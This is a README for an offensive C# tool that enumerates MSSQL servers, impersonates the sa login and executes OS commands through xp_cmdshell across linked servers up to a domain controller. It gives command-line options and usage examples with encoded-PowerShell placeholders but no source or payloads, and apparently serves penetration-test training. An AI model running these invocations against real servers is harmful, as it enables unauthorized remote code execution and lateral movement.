# SQLinkedCodeExec

![image](https://user-images.githubusercontent.com/57995347/164911965-bc2c290e-f2ad-446b-a030-a3fb2910f52e.png)


This is an Offensive C# Tool that performs the following:
- basic enumeration on MSSQL server(s)
- execute commands on the backend OS hosting the MSSQL server(s)

The tool accepts user supplied credentials or leverages the access token of the logged-on user

```
SQLinkedCodeExec.exe /t <target> /user <username> /pass <password>  <command-to-run>
```

Options:
```
/codexec - executes specified code on MSSQL servers
/impersonate - impersonates sa user on MSSQL server
/imp_db - specifies the database for impersonation e.g. msdb. This must be used with imp_user
/imp_user - impersonates specified login on a MSSQL server e.g. sa
/localexec - enables code execution via xp_cmdshell on local MSSQL server
/link1exec - enables code execution via xp_cmdshell on single hop linked MSSQL - Link 1
/link2exec - enables code execution via xp_cmdshell on double hop linked MSSQL - Link 2
/lnk - determines if the target MSSQL server has any linked servers
/lnkedt - specifies the linked server connected to our target MSSQL - Link 1
/lnkedtt - specifies the double linked server connect to our target MSSQL - Link 2
/lnkedtcheck1 - enumerates linked server  - Link 1
/lnkedtcheck2 - enumerates double linked server  - Link 1
/pass - specifies password to use
/t - specifies the target MSSQL server
/syscreds - ignores the user specified and uses the token of the currently logged in user
/user - specifies the target user account
```

Usage:
```
SQLinkedCodeExec.exe /t <target> /user <username>  /pass <password>  <command-to-run>

Usage: Examples:"
SQLinkedCodeExec.exe /?  - show's this help menu \n"

//Authenticate to target MSSQL with username and password"
SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password>\n"

//Authenticate to target MSSQL with current system token"
SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /syscreds true\n"

//Execute Code on target MSSQL server "
SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /localexec true /codexec < Whatever - command - goes - here > \n"

//Check if target MSSQL server has any server links"
SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true /lnk true\n"

//Execute Code on linked MSSQL server instance (appsrv01) - Link 1"
SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true  /link1exec true /lnkedt appsrv01 /codexec <powershell - enc...>\n"

//Impersonate sa account and execute Code on linked MSSQL server instance (appsrv01) - Link 1"
SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnk true /impersonate true /imp_user sa /imp_db msdb /codexec <powershell - enc>\n"

//Enumerate linked MSSQL server (appsrv01) for additional links to other instances - Link 1"
SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnkedt appsrv01 /lnkedtcheck1 true\n"

//Checked double linked server (dc01) for the user we are operating as - Link 1"
SQLinkedCodeExec.exe /t <target name or IP> /syscreds true  /lnkedt appsrv01 /lnkedtt dc01 /lnkedtcheck2 true\n"

//Execute code on double linked server (dc01)"
SQLinkedCodeExec.exe /t dc01 /user someguy /pass somepass /syscreds true /lnk true  /link2exec true /lnkedt appsrv01 /lnkedtt dc01 /codexec <powershell - enc....>\n"
```


# Credits
- Heavily inspired by and leveraged code from "[chvancooten's Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)" 
